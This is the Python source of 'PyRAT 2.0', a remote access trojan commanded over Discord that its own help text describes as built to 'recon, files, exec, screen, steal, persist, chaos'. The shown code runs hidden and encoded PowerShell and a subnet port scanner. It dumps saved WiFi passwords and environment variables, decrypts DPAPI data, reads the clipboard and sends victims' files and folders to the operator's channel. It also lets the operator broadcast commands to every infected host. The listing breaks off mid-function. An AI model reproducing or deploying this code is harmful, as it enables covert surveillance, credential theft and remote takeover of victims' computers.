from __future__ import annotations

import asyncio, base64, ctypes, hashlib, io, json, logging, math, multiprocessing, os
import platform, random, re, shlex, shutil, socket, sqlite3, subprocess
import sys, tempfile, threading, time, traceback, uuid, webbrowser, zipfile
from datetime import datetime
from pathlib import Path

# ============================================================
# PASTE YOUR DISCORD BOT TOKEN HERE
# ============================================================
TOKEN = "YOUR_DISCORD_BOT_TOKEN"

APP = "PyRAT"
VERSION = "2.0"
WIN = os.name == "nt"
FROZEN = getattr(sys, "frozen", False)
EXE_DIR = Path(sys.executable).resolve().parent if FROZEN else Path(__file__).resolve().parent
MEIPASS = Path(getattr(sys, "_MEIPASS", EXE_DIR))
WORK = Path(os.environ.get("TEMP", tempfile.gettempdir())) / ".pyrat"
WORK.mkdir(parents=True, exist_ok=True)
LOG_FILE = WORK / "pyrat.log"

if FROZEN:
    multiprocessing.freeze_support()


def _stdio_shim():
    if sys.stdout is not None and sys.stderr is not None:
        return
    f = open(WORK / "stdio.log", "a", encoding="utf-8", errors="replace", buffering=1)
    if sys.stdout is None:
        sys.stdout = f
    if sys.stderr is None:
        sys.stderr = f


_stdio_shim()

logging.basicConfig(filename=str(LOG_FILE), level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(APP)

CFG_FILE = WORK / "config.json"


def cfg_load():
    try:
        return json.loads(CFG_FILE.read_text("utf-8"))
    except Exception:
        return {}


def cfg_save(d):
    try:
        CFG_FILE.write_text(json.dumps(d, indent=2), "utf-8")
    except Exception:
        pass


CFG = cfg_load()
CLIENT_ID = CFG.get("id") or uuid.uuid4().hex[:6]
CFG["id"] = CLIENT_ID
cfg_save(CFG)

HOST = socket.gethostname()
RUN_ID = uuid.uuid4().hex[:6]


def _slug(s):
    s = re.sub(r"[^A-Za-z0-9-]+", "-", s).strip("-").lower()
    return re.sub(r"-{2,}", "-", s) or "host"


HOST_SLUG = _slug(HOST)[:20]
SESSION = f"{HOST_SLUG}-{CLIENT_ID}-{RUN_ID}"
START_TS = time.time()

PREFIX = os.environ.get("PYRAT_PREFIX") or CFG.get("prefix", ".")
CHUNK = int(CFG.get("chunk", 7_500_000))
WHITELIST = set(CFG.get("whitelist", []))
STRICT_CHANNEL = CFG.get("strict", True)


def soft(name):
    try:
        return __import__(name, fromlist=["*"])
    except Exception as e:
        log.debug("import %s failed: %s", name, e)
        return None


discord = soft("discord")
psutil = soft("psutil")
mss = soft("mss")
numpy = soft("numpy")
cv2 = soft("cv2")
requests = soft("requests")
pyautogui = soft("pyautogui")
winreg = soft("winreg")
pynput = soft("pynput")
pyaudio = soft("pyaudio")
imageio = soft("imageio")

try:
    from PIL import Image as PILImage
except Exception:
    PILImage = None

try:
    from Crypto.Cipher import AES
except Exception:
    AES = None

if discord is None:
    print("pip install discord.py[voice] PyNaCl")
    sys.exit(1)


def fix_opus():
    try:
        if discord.opus.is_loaded():
            return True
    except Exception:
        pass
    import discord.opus as dopus
    pkg = Path(dopus.__file__).parent
    cands = []
    for pat in ("libopus*.dll", "opus.dll", "libopus.so*", "libopus*.dylib"):
        cands += sorted(pkg.glob(pat))
        cands += sorted(MEIPASS.glob(f"**/{pat}"))
        cands += sorted(EXE_DIR.glob(pat))
    for c in dict.fromkeys(cands):
        try:
            discord.opus.load_opus(str(c))
            log.info("opus loaded: %s", c)
            return True
        except Exception:
            pass
    try:
        dopus._load_default()
        return True
    except Exception as e:
        log.warning("opus unavailable: %s", e)
        return False


OPUS_OK = fix_opus()

try:
    import nacl.secret
    NACL_OK = True
except Exception:
    NACL_OK = False


def decode(b):
    if not b:
        return ""
    for enc in ("utf-8", "cp850", "cp1252", "latin-1"):
        try:
            return b.decode(enc)
        except Exception:
            pass
    return b.decode("utf-8", "replace")


CREATE_NO_WINDOW = 0x08000000
DETACHED = 0x00000008
NEWGRP = 0x00000200


def run(cmd, timeout=120, cwd=None, shell=None):
    if shell is None:
        shell = isinstance(cmd, str)
    try:
        p = subprocess.run(cmd, shell=shell, capture_output=True, timeout=timeout,
                           cwd=cwd, creationflags=CREATE_NO_WINDOW if WIN else 0)
        return decode((p.stdout or b"") + (p.stderr or b"")).strip()
    except subprocess.TimeoutExpired as e:
        return f"[timeout after {timeout}s]\n" + decode(e.stdout or b"")
    except Exception as e:
        return f"[error] {e}"


def ps(cmd, timeout=120):
    return run(["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy",
                "Bypass", "-Command", cmd], timeout=timeout)


def pse(cmd, timeout=120):
    enc = base64.b64encode(cmd.encode("utf-16-le")).decode()
    return run(["powershell", "-NoProfile", "-EncodedCommand", enc], timeout=timeout)


def spawn(path, args=None, hidden=True):
    cf = (DETACHED | NEWGRP | (CREATE_NO_WINDOW if hidden else 0)) if WIN else 0
    return subprocess.Popen([path] + (args or []), creationflags=cf, close_fds=True)


def spawn_bat(path):
    if WIN:
        return spawn("cmd.exe", ["/c", str(path)])
    return spawn(str(path))


def whoami():
    try:
        return os.getlogin()
    except Exception:
        return os.environ.get("USERNAME") or os.environ.get("USER") or "?"


def human(n):
    n = float(n)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.1f}{u}"
        n /= 1024
    return f"{n:.1f}PB"


def uptime_str():
    if psutil:
        try:
            d = int(time.time() - psutil.boot_time())
            return f"{d // 86400}d {(d % 86400) // 3600}h {(d % 3600) // 60}m"
        except Exception:
            pass
    return "?"


if WIN:
    _u32 = ctypes.windll.user32
    _k32 = ctypes.windll.kernel32
    _k32.GlobalAlloc.restype = ctypes.c_void_p
    _k32.GlobalLock.restype = ctypes.c_void_p
    _u32.GetClipboardData.restype = ctypes.c_void_p
    _k32.LocalFree.restype = ctypes.c_void_p
    _k32.LocalFree.argtypes = [ctypes.c_void_p]


def clip_get():
    if not WIN:
        return ""
    if not _u32.OpenClipboard(0):
        return ""
    try:
        h = _u32.GetClipboardData(13)
        if not h:
            return ""
        p = _k32.GlobalLock(ctypes.c_void_p(h))
        try:
            return ctypes.wstring_at(p)
        finally:
            _k32.GlobalUnlock(ctypes.c_void_p(h))
    finally:
        _u32.CloseClipboard()


def clip_set(text):
    if not WIN:
        return
    data = text + "\0"
    size = len(data) * 2
    h = _k32.GlobalAlloc(0x0002, size)
    if not h:
        return
    p = _k32.GlobalLock(ctypes.c_void_p(h))
    ctypes.memmove(p, ctypes.create_unicode_buffer(data), size)
    _k32.GlobalUnlock(ctypes.c_void_p(h))
    for _ in range(20):
        if _u32.OpenClipboard(0):
            break
        time.sleep(0.02)
    else:
        return
    try:
        _u32.EmptyClipboard()
        _u32.SetClipboardData(13, ctypes.c_void_p(h))
    finally:
        _u32.CloseClipboard()


def active_window():
    if not WIN:
        return ""
    h = _u32.GetForegroundWindow()
    n = _u32.GetWindowTextLengthW(h)
    buf = ctypes.create_unicode_buffer(n + 1)
    _u32.GetWindowTextW(h, buf, n + 1)
    return buf.value


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]


def dpapi(data):
    bi = DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data, len(data)),
                                          ctypes.POINTER(ctypes.c_char)))
    bo = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None,
                                                    0, ctypes.byref(bo)):
        raise OSError("CryptUnprotectData failed")
    try:
        return ctypes.string_at(bo.pbData, bo.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(ctypes.cast(bo.pbData, ctypes.c_void_p))


REG = {}
ALIAS = {}


def command(name, aliases=(), cat="misc", desc="", usage="", timing=False):
    def deco(fn):
        REG[name] = dict(name=name, aliases=list(aliases), cat=cat, desc=desc,
                         usage=usage, fn=fn, timing=timing)
        for a in aliases:
            ALIAS[a] = name
        return fn
    return deco


class Ctx:
    def __init__(self, msg, name, raw, sink=None):
        self.msg = msg
        self.name = name
        self.raw = raw
        self.sink = sink

    @property
    def channel(self):
        return self.msg.channel

    @property
    def author(self):
        return self.msg.author

    @property
    def attachments(self):
        return self.msg.attachments

    @property
    def voice_client(self):
        return discord.utils.get(bot.voice_clients, guild=self.msg.guild)

    @property
    def argv(self):
        try:
            toks = shlex.split(self.raw, posix=False)
        except Exception:
            toks = self.raw.split()
        out = []
        for t in toks:
            if len(t) >= 2 and t[0] == t[-1] and t[0] in "\"'":
                t = t[1:-1]
            out.append(t)
        return out

    async def reply(self, text="", code=False):
        text = "" if text is None else str(text)
        if not text:
            text = "ok"
        if self.sink is not None:
            self.sink.append(text)
            return
        limit = 1850
        if code or len(text) > limit:
            parts = [text[i:i + limit] for i in range(0, len(text), limit)]
        else:
            parts = [text]
        for p in parts:
            await self.msg.channel.send("```\n" + p + "\n```" if code or len(parts) > 1 else p)

    async def file(self, data, name):
        if isinstance(data, (str, Path)):
            data = Path(data).read_bytes()
        if self.sink is not None:
            self.sink.append(f"[file {name} {human(len(data))}]")
            return
        if len(data) <= CHUNK:
            await self.msg.channel.send(file=discord.File(io.BytesIO(data), filename=name))
            return
        n = math.ceil(len(data) / CHUNK)
        for i in range(n):
            await self.msg.channel.send(file=discord.File(
                io.BytesIO(data[i * CHUNK:(i + 1) * CHUNK]), filename=f"{name}.{i + 1:03d}"))
        await self.msg.channel.send(f"{n} parts sent, run `.merge {name}`")


intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.voice_states = True
bot = discord.Client(intents=intents)

SESSION_CHANNEL = None
_EAT = []
PYNS = None
STATE = {"stream": None, "stream_cfg": None, "klog": None, "clipwatch": False,
         "revshell": None, "watchdogs": {}, "hb": 60, "hb_task": None}


async def dispatch(msg, sink=None):
    body = msg.content[len(PREFIX):].strip()
    if not body:
        return
    name, _, raw = body.partition(" ")
    name = ALIAS.get(name.lower(), name.lower())
    meta = REG.get(name)
    if not meta:
        return
    ctx = Ctx(msg, name, raw.strip(), sink=sink)
    t0 = time.perf_counter()
    try:
        fn = meta["fn"]
        if asyncio.iscoroutinefunction(fn):
            result = await fn(ctx)
        else:
            result = await asyncio.to_thread(fn, ctx)
    except Exception as e:
        log.exception("cmd %s", name)
        await ctx.reply(f"[{name}] {type(e).__name__}: {e}\n{traceback.format_exc(limit=4)}")
        return
    if result is not None:
        await ctx.reply(result)
    if meta["timing"]:
        await ctx.reply(f"`{name}` in {time.perf_counter() - t0:.2f}s")


@bot.event
async def on_message(msg):
    if msg.author.bot:
        return
    if not msg.content.startswith(PREFIX):
        return
    if WHITELIST and msg.author.id not in WHITELIST:
        return
    if STRICT_CHANNEL and not isinstance(msg.channel, discord.DMChannel):
        if SESSION_CHANNEL is not None:
            if msg.channel.id != SESSION_CHANNEL.id:
                return
        elif not (msg.channel.name or "").lower().startswith(SESSION):
            return
    asyncio.create_task(dispatch(msg))


@command("help", aliases=["h", "?"], cat="core", desc="Show all commands or details on one", usage="help [command]")
async def c_help(ctx):
    if ctx.raw:
        m = REG.get(ALIAS.get(ctx.raw.lower(), ctx.raw.lower()))
        if not m:
            return await ctx.reply(f"unknown: {ctx.raw}")
        return await ctx.reply(f"{PREFIX}{m['name']} {m['usage']}\n{m['desc']}\n"
                               f"aliases: {', '.join(m['aliases']) or '-'}\ncategory: {m['cat']}")
    cats = {}
    for m in REG.values():
        cats.setdefault(m["cat"], []).append(m)
    out = [f"{APP} {VERSION} - {len(REG)} commands",
           "Discord-controlled RAT: recon, files, exec, screen, steal, persist, chaos.",
           f"`{PREFIX}help <command>` for details on one command", ""]
    for c in sorted(cats):
        out.append(f"[{c}]")
        for m in sorted(cats[c], key=lambda x: x["name"]):
            out.append(f"{PREFIX}{m['name']} - {m['desc']}" if m["desc"] else PREFIX + m["name"])
        out.append("")
    await ctx.reply("\n".join(out))


@command("ping", aliases=["p"], cat="core", desc="Liveness, latency and uptime")
async def c_ping(ctx):
    a = int(time.time() - START_TS)
    await ctx.reply(f"pong | id={CLIENT_ID} | {HOST} | {whoami()} | sys up {uptime_str()} | "
                    f"agent {a // 3600}h {(a % 3600) // 60}m | ws {round(bot.latency * 1000)}ms | "
                    f"pid {os.getpid()}")


@command("debug", cat="core", desc="Show agent diagnostics")
async def c_debug(ctx):
    deps = (("discord", discord), ("psutil", psutil), ("mss", mss), ("cv2", cv2),
            ("numpy", numpy), ("PIL", PILImage), ("AES", AES), ("pynput", pynput),
            ("pyaudio", pyaudio), ("pyautogui", pyautogui))
    await ctx.reply(f"version : {VERSION}\nhost    : {HOST} / {SESSION}\nfrozen  : {FROZEN}\n"
                    f"opus    : {OPUS_OK}\nnacl    : {NACL_OK}\ncommands: {len(REG)}\n"
                    f"deps    : " + ", ".join(f"{n}={'ok' if m else 'MISSING'}" for n, m in deps))


@command("logs", cat="core", desc="Download the agent log")
async def c_logs(ctx):
    await ctx.file(LOG_FILE.read_bytes() if LOG_FILE.exists() else b"", "pyrat.log")


@command("interval", cat="core", desc="Set heartbeat interval in seconds", usage="interval <seconds>")
def c_interval(ctx):
    STATE["hb"] = max(10, int(ctx.raw or 60))
    return f"heartbeat every {STATE['hb']}s"


@command("broadcast", aliases=["bc"], cat="core", desc="Send a command to all clients", usage="broadcast <cmd>")
async def c_broadcast(ctx):
    n = 0
    for g in bot.guilds:
        for ch in g.text_channels:
            if ch.id != ctx.channel.id and re.match(r"^[\w.-]+-[0-9a-f]{6}$", ch.name):
                try:
                    await ch.send(PREFIX + ctx.raw)
                    n += 1
                except Exception:
                    pass
    await ctx.reply(f"sent to {n} channels")


@command("reconnect", cat="core", desc="Reconnect the bot")
async def c_reconnect(ctx):
    global SESSION_CHANNEL
    await ctx.reply("reconnecting, new session channel will be created")
    SESSION_CHANNEL = None
    await bot.close()


@command("batch", cat="core", desc="Run a command list from a file", usage="batch <file>")
async def c_batch(ctx):
    lines = Path(ctx.raw).read_text("utf-8", errors="replace").splitlines()
    sink, out = [], []
    shim = type("M", (), {"content": "", "channel": ctx.channel, "guild": ctx.channel.guild,
                          "author": ctx.author, "attachments": []})
    for ln in lines:
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        out.append(f"\n> {ln}")
        shim.content = PREFIX + ln
        await dispatch(shim, sink=sink)
        out += sink
        sink.clear()
    await ctx.reply("\n".join(out), code=True)


@command("sysinfo", aliases=["si", "info"], cat="recon", desc="Show full system info")
def c_sysinfo(ctx):
    L = []

    def add(k, v):
        L.append(f"{k:<16}{v}")

    add("hostname", HOST)
    add("user", whoami())
    add("domain", os.environ.get("USERDOMAIN", "?"))
    add("os", f"{platform.system()} {platform.release()} {platform.version()}")
    add("arch", platform.machine())
    add("pid", os.getpid())
    add("python", sys.version.split()[0])
    add("frozen", FROZEN)
    if psutil:
        add("boot", datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M"))
        add("uptime", uptime_str())
        add("cpu", f"{psutil.cpu_count(logical=False)}c/{psutil.cpu_count()}t "
                   f"{psutil.cpu_percent(interval=0.4)}%")
        vm = psutil.virtual_memory()
        add("ram", f"{human(vm.used)}/{human(vm.total)} ({vm.percent}%)")
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                add("disk", f"{p.device} {human(u.used)}/{human(u.total)} ({u.percent}%)")
            except Exception:
                pass
    if WIN:
        for k, cmd in (("cpu_name", "(Get-CimInstance Win32_Processor).Name"),
                       ("gpu", "(Get-CimInstance Win32_VideoController).Name"),
                       ("model", "(Get-CimInstance Win32_ComputerSystem).Model"),
                       ("serial", "(Get-CimInstance Win32_BIOS).SerialNumber")):
            v = ps(cmd, timeout=25).splitlines()
            if v:
                add(k, " / ".join(v[:2]))
    return "\n".join(L)


@command("env", cat="recon", desc="Show environment variables")
def c_env(ctx):
    return "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))


@command("users", cat="recon", desc="List users, sessions and admins")
def c_users(ctx):
    out = [run("net user"), ""]
    for grp in ("Administrators", "Administratoren"):
        r = run(f"net localgroup {grp}")
        low = r.lower()
        if "successfully" in low or "erfolgreich" in low:
            out.append(r)
            out.append("")
    if psutil:
        out.append("[active sessions]")
        for u in psutil.users():
            out.append(f"{u.name} @ {u.host} since {datetime.fromtimestamp(u.started)}")
    return "\n".join(out)


@command("av", cat="recon", desc="List antivirus and Defender status")
def c_av(ctx):
    if not WIN:
        return "(windows only)"
    return (ps("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | "
               "Select-Object displayName,productState | Format-List", timeout=40) + "\n" +
            ps("Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,"
               "AntivirusSignatureLastUpdated | Format-List", timeout=40))


@command("proc", cat="recon", desc="List running processes", usage="proc [filter]")
def c_proc(ctx):
    if not psutil:
        return run("tasklist")
    f = ctx.raw.lower()
    rows = []
    for p in psutil.process_iter(["pid", "name", "username", "memory_info"]):
        try:
            if f and f not in p.info["name"].lower():
                continue
            rss = p.info["memory_info"].rss if p.info["memory_info"] else 0
            rows.append(f"{p.info['pid']:>7}  {p.info['name'][:32]:<34}{human(rss):>9}  "
                        f"{p.info['username'] or ''}")
        except Exception:
            pass
    return f"{'PID':>7}  {'NAME':<34}{'RSS':>9}  USER\n" + "\n".join(rows[:300])


@command("svc", cat="recon", desc="List running services", usage="svc [filter]")
def c_svc(ctx):
    out = ps('Get-Service | Where-Object {$_.Status -eq "Running"} | '
             'ForEach-Object { "$($_.Name)`t$($_.DisplayName)" }', timeout=60).splitlines()
    if ctx.raw:
        out = [s for s in out if ctx.raw.lower() in s.lower()]
    return "\n".join(out) or "(none)"


@command("netstat", cat="recon", desc="Show connections with owning process")
def c_netstat(ctx):
    if not psutil:
        return run("netstat -ano")
    names = {}
    for p in psutil.process_iter(["pid", "name"]):
        try:
            names[p.info["pid"]] = p.info["name"]
        except Exception:
            pass
    L = [f"{'LADDR':<24}{'RADDR':<24}{'STATE':<14}PID NAME"]
    for c in psutil.net_connections(kind="inet"):
        try:
            la = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "-"
            ra = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "-"
            L.append(f"{la:<24}{ra:<24}{c.status:<14}{c.pid or 0} {names.get(c.pid, '')}")
        except Exception:
            pass
    return "\n".join(L)


@command("lan", aliases=["arp"], cat="recon", desc="Show ARP table and network interfaces")
def c_lan(ctx):
    out = [run("arp -a")]
    if psutil:
        out.append("\n[interfaces]")
        for n, addrs in psutil.net_if_addrs().items():
            for a in addrs:
                if a.family == socket.AF_INET:
                    out.append(f"{n}: {a.address}/{a.netmask}")
    return "\n".join(out)


@command("portscan", aliases=["pscan"], cat="recon", desc="Scan host or subnet for open ports", usage="portscan <host|cidr> [ports]")
def c_portscan(ctx):
    a = ctx.argv
    if not a:
        return "usage: .portscan 192.168.1.0/24 22,80,445"
    ports = [int(x) for x in (a[1].split(",") if len(a) > 1 else
                              "21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,5900,8080".split(","))]
    host = a[0]
    if "/" in host:
        pref = ".".join(host.split("/")[0].split(".")[:3])
        hosts = [f"{pref}.{i}" for i in range(1, 255)]
    else:
        hosts = [host]
    found = []
    lock = threading.Lock()

    def probe(ip):
        for pt in ports:
            s = socket.socket()
            s.settimeout(0.35)
            try:
                if s.connect_ex((ip, pt)) == 0:
                    try:
                        svc = socket.getservbyport(pt)
                    except Exception:
                        svc = ""
                    with lock:
                        found.append(f"{ip}:{pt} {svc}")
            except Exception:
                pass
            finally:
                s.close()

    th = [threading.Thread(target=probe, args=(h,), daemon=True) for h in hosts]
    for t in th:
        t.start()
    for t in th:
        t.join(0.35 * len(ports) + 2)
    return f"{len(hosts)} hosts / {len(ports)} ports\n" + "\n".join(sorted(found))


@command("wifi", cat="recon", desc="Show saved WiFi profiles and passwords")
def c_wifi(ctx):
    if not WIN:
        return "(windows only)"
    raw = run("netsh wlan show profiles")
    names = [n.strip() for n in re.findall(r":\s*(.+?)\s*$", raw, re.M)]
    names = [n for n in names if not n.lower().startswith(("profil", "profiles", "richtlinien", "user prof"))]
    out = []
    for n in names:
        d = run(f'netsh wlan show profile name="{n}" key=clear')
        k = re.search(r"(?:Schl.sselinhalt|Key Content)\s*:\s*(.+)", d)
        out.append(f"{n:<32} {k.group(1).strip() if k else '-'}")
    return "\n".join(out) or raw


@command("installed", aliases=["software"], cat="recon", desc="List installed software")
def c_installed(ctx):
    if not winreg:
        return ps("Get-ItemProperty HKLM:\\Software\\*\\Uninstall\\* | "
                  "Select DisplayName,DisplayVersion")
    rows = []
    for root, path in ((winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                       (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                       (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")):
        try:
            k = winreg.OpenKey(root, path)
            for i in range(winreg.QueryInfoKey(k)[0]):
                try:
                    sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                    nm = winreg.QueryValueEx(sk, "DisplayName")[0]
                    try:
                        v = winreg.QueryValueEx(sk, "DisplayVersion")[0]
                    except Exception:
                        v = ""
                    rows.append(f"{nm} {v}")
                except Exception:
                    pass
        except Exception:
            pass
    return "\n".join(sorted(set(rows)))


@command("startup", aliases=["autorun"], cat="recon", desc="List autostart entries")
def c_startup(ctx):
    out = []
    if winreg:
        for hive, tag in ((winreg.HKEY_CURRENT_USER, "HKCU"), (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            for p in (r"Software\Microsoft\Windows\CurrentVersion\Run",
                      r"Software\Microsoft\Windows\CurrentVersion\RunOnce"):
                try:
                    k = winreg.OpenKey(hive, p)
                    for i in range(winreg.QueryInfoKey(k)[1]):
                        n, v, _ = winreg.EnumValue(k, i)
                        out.append(f"[{tag}] {n} = {v}")
                except Exception:
                    pass
    for d in (Path(os.environ.get("APPDATA", "")) / "Microsoft/Windows/Start Menu/Programs/Startup",
              Path(os.environ.get("PROGRAMDATA", "")) / "Microsoft/Windows/Start Menu/Programs/StartUp"):
        if d.is_dir():
            for f in d.iterdir():
                out.append(f"[Startup] {f.name}")
    return "\n".join(out)


@command("tasks", cat="recon", desc="List scheduled tasks")
def c_tasks(ctx):
    return run("schtasks /query /fo TABLE /nh", timeout=90)[:15000]


CWD = {"p": Path.cwd()}


def _resolve(raw):
    p = Path(raw).expanduser()
    if not p.is_absolute():
        p = CWD["p"] / p
    return p


@command("cd", cat="files", desc="Change directory (or print current)", usage="cd [path]")
async def c_cd(ctx):
    p = _resolve(ctx.raw) if ctx.raw else CWD["p"]
    if not p.is_dir():
        return await ctx.reply(f"not found: {p}")
    CWD["p"] = p.resolve()
    await ctx.reply(str(CWD["p"]))


@command("ls", aliases=["dir"], cat="files", desc="List directory contents", usage="ls [path]")
def c_ls(ctx):
    p = _resolve(ctx.raw) if ctx.raw else CWD["p"]
    if p.is_file():
        return f"{p.name} {human(p.stat().st_size)}"
    rows = []
    for e in sorted(p.iterdir(), key=lambda x: (x.is_file(), x.name.lower()))[:500]:
        try:
            st = e.stat()
            rows.append(f"{'d' if e.is_dir() else '-'} {st.st_size:>12,} "
                        f"{datetime.fromtimestamp(st.st_mtime):%Y-%m-%d %H:%M} {e.name}")
        except Exception:
            rows.append(f"? {e.name}")
    return f"{p}\n" + "\n".join(rows)


@command("tree", cat="files", desc="Show a directory tree", usage="tree <path> [depth]")
def c_tree(ctx):
    a = ctx.argv
    root = Path(a[0]).expanduser() if a else CWD["p"]
    depth = int(a[1]) if len(a) > 1 else 3
    if not root.is_absolute():
        root = CWD["p"] / root
    out = [str(root)]

    def walk(d, pre, lvl):
        if lvl > depth:
            return
        try:
            items = sorted(d.iterdir(), key=lambda x: (x.is_file(), x.name.lower()))
        except Exception:
            return
        for i, e in enumerate(items[:200]):
            last = i == len(items) - 1
            out.append(f"{pre}{'└── ' if last else '├── '}{e.name}{'/' if e.is_dir() else ''}")
            if e.is_dir():
                walk(e, pre + ("    " if last else "│   "), lvl + 1)

    walk(root, "", 1)
    return "\n".join(out)


@command("cat", cat="files", desc="Print a file's contents", usage="cat <file>")
def c_cat(ctx):
    if not ctx.raw:
        return "usage: .cat <file>"
    return _resolve(ctx.raw).read_text("utf-8", errors="replace")[:20000]


@command("find", cat="files", desc="Search for files by name", usage="find <path> <pattern>")
def c_find(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .find C:\\Users *.pdf"
    root = Path(a[0])
    pat = a[1].lower().replace("*", "")
    hits = []
    for dp, _, fs in os.walk(root):
        for f in fs:
            if pat in f.lower():
                fp = Path(dp) / f
                try:
                    hits.append(f"{fp} {human(fp.stat().st_size)}")
                except Exception:
                    pass
        if len(hits) > 800:
            break
    return f"{len(hits)} hits\n" + "\n".join(hits)


@command("grep", cat="files", desc="Search inside files for text", usage="grep <pattern> <path> [ext]")
def c_grep(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .grep password C:\\Users txt"
    pat, root = a[0].lower(), Path(a[1])
    ext = a[2].lower().lstrip(".") if len(a) > 2 else None
    hits = []
    for dp, _, fs in os.walk(root):
        for f in fs:
            if ext and not f.lower().endswith("." + ext):
                continue
            fp = Path(dp) / f
            try:
                if fp.stat().st_size > 5_000_000:
                    continue
                for i, line in enumerate(fp.read_text("utf-8", errors="ignore").splitlines(), 1):
                    if pat in line.lower():
                        hits.append(f"{fp}:{i}: {line.strip()[:160]}")
                        if len(hits) > 400:
                            return "\n".join(hits)
            except Exception:
                pass
    return f"{len(hits)} hits\n" + "\n".join(hits)


@command("pull", aliases=["fetch", "get"], cat="files", desc="Download a file or folder", usage="pull <path>")
async def c_pull(ctx):
    if not ctx.raw:
        return await ctx.reply("usage: .pull <path>")
    p = _resolve(ctx.raw)
    if not p.exists():
        return await ctx.reply(f"not found: {p}")
    if p.is_file():
        return await ctx.file(p.read_bytes(), p.name)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for dp, _, fs in os.walk(p):
            for f in fs:
                fp = Path(dp) / f
                try:
                    z.write(fp, fp.relative_to(p.parent))
                except Exception:
                    pass
    await ctx.file(buf.getvalue(), p.name + ".zip")


@command("push", aliases=["put"], cat="files", desc="Upload message attachments", usage="push [folder]")
async def c_push(ctx):
    if not ctx.attachments:
        return await ctx.reply("attach a file to the message")
    dest = _resolve(ctx.raw) if ctx.raw else CWD["p"]
    dest.mkdir(parents=True, exist_ok=True)
    got = []
    for a in ctx.attachments:
        (dest / a.filename).write_bytes(await a.read())
        got.append(a.filename)
    await ctx.reply(f"{len(got)} file(s) -> {dest}\n" + "\n".join(got))


@command("merge", aliases=["jf"], cat="files", desc="Rejoin split file parts", usage="merge <file>")
def c_merge(ctx):
    if not ctx.raw:
        return "usage: .merge <file>"
    p = _resolve(ctx.raw)
    parts = sorted(p.parent.glob(p.name + ".*"))
    if not parts:
        return "no parts found"
    out = p.parent / (p.name + ".joined")
    with open(out, "wb") as f:
        for part in parts:
            f.write(part.read_bytes())
    return f"{len(parts)} parts -> {out} ({human(out.stat().st_size)})"


@command("rm", aliases=["del"], cat="files", desc="Delete a file or folder", usage="rm <path> [-r]")
def c_rm(ctx):
    a = ctx.argv
    if not a:
        return "usage: .rm <path> [-r]"
    p = _resolve(a[0])
    if p.is_dir():
        if "-r" in a:
            shutil.rmtree(p, ignore_errors=True)
        else:
            p.rmdir()
    else:
        p.unlink()
    return f"deleted {p}"


@command("mv", cat="files", desc="Move or rename", usage="mv <src> <dst>")
def c_mv(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .mv <src> <dst>"
    shutil.move(a[0], a[1])
    return "ok"


@command("cp", cat="files", desc="Copy a file or folder", usage="cp <src> <dst>")
def c_cp(ctx):
    a = ctx.argv
    if len(a) < 2:
        return "usage: .cp <src> <dst>"
    (shutil.copytree if Path(a[0]).is_dir() else shutil.copy2)(a[0], a[1])
    return "ok"


@command("mkdir", cat="files", desc="Create a folder", usage="mkdir <path>")
def c_mkdir(ctx):
    if not ctx.raw:
        return "usage: .mkdir <path>"
    Path(ctx.raw).expanduser().mkdir(parents=True, exist_ok=True)
    return "ok"


@command("zip", cat="files", desc="Zip a file or folder", usage="zip <source> [target]")
def c_zip(ctx):
    a = ctx.argv
    if not a:
        return "usage: .zip <source> [target]"
    src = Path(a[0])
    dst = Path(a[1]) if len(a) > 1 else src.with_suffix(".zip")
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        if src.is_dir():
            for dp, _, fs in os.walk(src):
                for f in fs:
                    fp = Path(dp) / f
                    z.write(fp, fp.relative_to(src.parent))
        else:
            z.write(src, src.name)
    return f"{dst} ({human(dst.stat().st_size)})"


@command("unzip", cat="files", desc="Extract a zip archive", usage="unzip <archive> [target]")
def c_unzip(ctx):
    a = ctx.argv
    if not a:
        return "usage: .unzip <archive> [target]"
    dst = Path(a[1]) if len(a) > 1 else Path(a[0]).with_suffix("")
    with zipfile.ZipFile(a[0]) as z:
        z.extractall(dst)
    return f"-> {dst}"


@command("hash", cat="files", desc="Show MD5/SHA1/SHA256 hashes", usage="hash <file>")
def c_hash(ctx):
    if not ctx.raw:
        return "usage: .hash <file>"
    p = _resolve(ctx.raw)
    hs = {n: hashlib.new(n) for n in ("md5", "sha1", "sha256")}
    with open(p, "rb") as f:
        for blk in iter(lambda: f.read(1 << 20), b""):
            for h in hs.values():
                h.update(blk)
    return "\n".join(f"{n}: {h.hexdigest()}" for n, h in hs.items())


@command("hide", cat="files", desc="Hide a file or folder", usage="hide <path>")
def c_hide(ctx):
    if not WIN:
        return "(windows only)"
    p = _resolve(ctx.raw)
